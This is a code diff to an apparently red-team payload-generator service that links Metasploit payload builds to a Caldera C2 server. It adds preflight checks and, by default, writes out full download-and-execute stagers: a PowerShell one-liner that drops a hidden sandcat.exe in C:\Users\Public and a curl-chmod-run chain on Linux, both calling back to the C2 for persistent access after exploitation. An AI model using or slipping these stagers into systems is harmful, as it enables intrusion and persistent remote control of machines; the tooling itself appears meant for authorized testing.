@@ -200,18 +200,43 @@ async function downloadFileSSH(
 // ─── Router ─────────────────────────────────────────────────────────────────
 
 export const payloadGeneratorRouter = router({
-  // ─── Get available options ────────────────────────────────────────────────
-  getOptions: protectedProcedure.query(() => {
+  // ─── Get available options (with Caldera C2 defaults) ────────────────────
+  getOptions: protectedProcedure.query(async () => {
+    const { getCalderaListenerDefaults, checkCalderaStatus } = await import("../lib/caldera-preflight");
+    const calderaDefaults = getCalderaListenerDefaults();
+    const calderaStatus = await checkCalderaStatus({ timeout: 5000 });
+
     return {
       payloadTypes: [...PAYLOAD_TYPES],
       formats: [...FORMATS],
       encoders: [...ENCODERS],
       architectures: [...ARCHITECTURES],
       platforms: [...PLATFORMS],
+      // Caldera C2 defaults for LHOST/LPORT
+      calderaDefaults: {
+        lhost: calderaDefaults.lhost,
+        lport: calderaDefaults.lport,
+        agentCallbackUrl: calderaDefaults.agentCallbackUrl,
+        c2Framework: calderaDefaults.c2Framework,
+        serverStatus: calderaStatus.ok ? "connected" : "disconnected",
+        serverVersion: calderaStatus.ok ? calderaStatus.version : undefined,
+        serverError: !calderaStatus.ok ? calderaStatus.error : undefined,
+      },
     };
   }),
 
-  // ─── Generate a payload ───────────────────────────────────────────────────
+  // ─── Caldera C2 preflight check ───────────────────────────────────────────
+  calderaPreflight: protectedProcedure.query(async () => {
+    const { checkCalderaStatus, getCalderaListenerDefaults } = await import("../lib/caldera-preflight");
+    const status = await checkCalderaStatus({ timeout: 8000 });
+    const defaults = getCalderaListenerDefaults();
+    return {
+      ...status,
+      defaults,
+    };
+  }),
+
+  // ─── Generate a payload (defaults to Caldera C2 callback) ────────────────
   generate: protectedProcedure
     .input(
       z.object({
@@ -227,9 +252,26 @@ export const payloadGeneratorRouter = router({
         platform: z.string().optional(),
         extraOptions: z.record(z.string(), z.string()).optional(),
         engagementId: z.number().optional(),
+        // C2 framework selection — defaults to Caldera
+        c2Framework: z.enum(["caldera", "metasploit", "sliver"]).default("caldera"),
+        deployCalderaAgent: z.boolean().default(true),
       })
     )
     .mutation(async ({ input, ctx }) => {
+      // ── Caldera Preflight: validate C2 server is reachable before building ──
+      if (input.c2Framework === "caldera" || input.deployCalderaAgent) {
+        const { validateCalderaConnection } = await import("../lib/caldera-preflight");
+        try {
+          const preflight = await validateCalderaConnection({ timeout: 8000 });
+          console.log(`[PayloadGen] Caldera preflight OK: ${preflight.ip}:${preflight.port} (${preflight.latencyMs}ms, v${preflight.version})`);
+        } catch (preflightErr: any) {
+          throw new TRPCError({
+            code: "PRECONDITION_FAILED",
+            message: `Caldera C2 preflight failed — cannot build payload. ${preflightErr.message}`,
+          });
+        }
+      }
+
       // ── ROE Scope Enforcement: note - LHOST is the listener (our server), not the target.
       // Payload generation itself doesn't target a host, but we log it for audit.
       // The actual target validation happens when the payload is delivered/executed.
@@ -385,6 +427,72 @@ export const payloadGeneratorRouter = router({
           ).catch(() => {});
 
           console.log(`[PayloadGen] Payload #${payloadId} completed: ${fileUrl} (${fileBuffer.length} bytes, SHA256: ${sha256})`);
+
+          // ── Caldera Agent Stager: deploy agent code alongside the payload ──
+          // When deployCalderaAgent is true, generate a secondary Caldera Sandcat
+          // agent stager script that will be executed post-exploitation.
+          // This ensures that successful MSF exploits automatically establish
+          // a Caldera C2 channel for persistent access and ability execution.
+          if (input.deployCalderaAgent) {
+            try {
+              const { getCalderaListenerDefaults } = await import("../lib/caldera-preflight");
+              const caldera = getCalderaListenerDefaults();
+              const agentPlatform = input.platform || "linux";
+              const isWindows = agentPlatform.includes("windows");
+
+              // Build the Caldera Sandcat agent download/execute command
+              // Sandcat is Caldera's default agent — it calls back to the server
+              // and registers itself for ability execution
+              const agentStager = isWindows
+                ? [
+                    `$server="${caldera.agentCallbackUrl}";`,
+                    `$url="$server/file/download";`,
+                    `$wc=New-Object System.Net.WebClient;`,
+                    `$wc.Headers.add("platform","windows");`,
+                    `$wc.Headers.add("file","sandcat.go");`,
+                    `$data=$wc.DownloadData($url);`,
+                    `get-process | ? {$_.modules.filename -like "C:\\Users\\Public\\sandcat.exe"} | stop-process -f;`,
+                    `rm -force "C:\\Users\\Public\\sandcat.exe" -ea ignore;`,
+                    `[io.file]::WriteAllBytes("C:\\Users\\Public\\sandcat.exe",$data) | Out-Null;`,
+                    `Start-Process -FilePath C:\\Users\\Public\\sandcat.exe -ArgumentList "-server ${caldera.agentCallbackUrl} -group red" -WindowStyle hidden;`,
+                  ].join(" ")
+                : [
+                    `server="${caldera.agentCallbackUrl}";`,
+                    `curl -s -X POST $server/file/download`,
+                    `-H "file:sandcat.go" -H "platform:linux"`,
+                    `> /tmp/sandcat.go;`,
+                    `chmod +x /tmp/sandcat.go;`,
+                    `/tmp/sandcat.go -server $server -group red &`,
+                  ].join(" ");
+
+              // Store the agent stager alongside the payload
+              const stagerKey = `payloads/${payloadId}-caldera-stager.${isWindows ? "ps1" : "sh"}`;
+              const { storagePut: stagerPut } = await import("../storage");
+              const { url: stagerUrl } = await stagerPut(
+                stagerKey,
+                Buffer.from(agentStager, "utf-8"),
+                "text/plain"
+              );
+
+              // Update the payload record with the agent stager info
+              await db
+                .update(generatedPayloads)
+                .set({
+                  extraOptions: JSON.stringify({
+                    ...(input.extraOptions || {}),
+                    calderaAgentStager: stagerUrl,
+                    calderaServer: caldera.agentCallbackUrl,
+                    c2Framework: "caldera",
+                  }),
+                })
+                .where(eq(generatedPayloads.id, Number(payloadId)));
+
+              console.log(`[PayloadGen] Caldera agent stager for #${payloadId}: ${stagerUrl}`);
+            } catch (agentErr: any) {
+              // Non-fatal — the MSF payload was still generated successfully
+              console.warn(`[PayloadGen] Caldera agent stager generation failed for #${payloadId}:`, agentErr.message);
+            }
+          }
         } catch (err: any) {
           console.error(`[PayloadGen] Error generating payload #${payloadId}:`, err);
           await db
